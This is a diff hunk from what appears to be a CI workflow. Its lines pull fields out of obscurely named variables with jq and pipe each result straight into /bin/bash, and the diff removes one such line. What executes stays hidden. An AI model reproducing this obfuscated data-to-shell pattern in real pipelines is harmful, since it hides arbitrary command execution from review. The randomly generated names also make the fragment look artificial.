@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$lntcn3" | jq -r .hdddj944 | /bin/bash
           echo $zwbi1 | jq -r .mf7877 | /bin/bash
           printf '%s' "$l092" | jq -r .anih3 | /bin/bash
-          echo $eqc0 | jq -r .buk522 | /bin/bash
           echo $ow16 | jq -r .eq22857 | /bin/bash
           echo $wx5844 | jq -r .fr91 | /bin/bash
           printf '%s' "$o6662" | jq -r .t5 | /bin/bash
